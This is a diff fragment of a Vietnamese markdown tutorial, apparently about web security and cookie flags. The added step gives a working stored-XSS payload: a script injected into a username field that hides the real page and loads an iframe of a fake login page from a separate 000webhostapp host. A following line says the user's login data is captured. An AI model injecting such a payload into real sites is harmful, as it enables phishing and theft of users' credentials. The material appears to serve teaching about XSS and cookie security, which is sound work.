@@ -46,7 +46,16 @@ if (isset($_POST['email'], $_POST['password'])) {
 ?>
 ```
 
-3. Đây là dữ liệu lấy được
+3. Chèn đoạn script này vào username. Để sau này khi user vào trang `https://00bluec10.000webhostapp.com/index.php` thì sẽ tự động cho user login trước.
+```javascript
+<script>
+var obj = document.getElementsByTagName('body')[0];
+obj.style="overflow:hidden;";
+obj.innerHTML="<iframe src='https://php-bacsic.000webhostapp.com/fakeLogin.php' style='overflow:hidden;border:none;width:100%;height:1000px'></iframe>";
+</script>
+```
+
+4. Sau khi user login thì chúng ta sẽ lấy được data từ user đó. Đây là dữ liệu lấy được
 ![Hinh 4.](~/../img/4.png)
 
 ## HttpFlag và secure cho cookie
